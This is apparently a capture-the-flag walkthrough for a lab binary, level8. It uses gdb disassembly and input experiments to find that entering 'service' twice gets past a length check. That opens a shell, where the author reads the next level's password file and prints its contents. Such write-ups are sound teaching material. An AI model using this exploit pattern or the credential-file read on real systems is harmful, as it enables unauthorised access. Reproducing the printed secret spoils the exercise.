We started the program and observed that it reads from `stdin` and prints `(nil), (nil)`:
```
$ ./level8
(nil), (nil)
```
By disassembling the `main` function, we discovered some interesting strings:
```
(gdb) disass main
[...]
  0x08048581 <+29>:	mov    $0x8048810,%eax      # "auth"
[...]
 0x080485c1 <+93>:	mov    $0x8048819,%eax      # "service"
[...]
0x08048648 <+228>:	mov    $0x804881f,%eax      # "reset"
[...]
0x0804867e <+282>:	mov    $0x8048825,%eax      # "login"
[...]
```
We decided to try entering the discovered strings to see their effect on the program:
```
./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
login
Password:
auth
0x804a028, 0x804a018
auth
0x804a038, 0x804a018
```
When we enter `auth` and `service`, the two addresses update by `0x10` from the last written address.

Using `gdb`, we looked further into the disassembly:
```
gdb> disass main
[...]
   0x08048625 <+193>:	cmp    eax,0x1e
[...]
```

A cmp instruction compares a value with `0x1e` (31 in decimal).

We deduct that making the difference between the addresses auth and service superior or equal to `0x20` (32 in decimal) may exploit the program.
```
./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
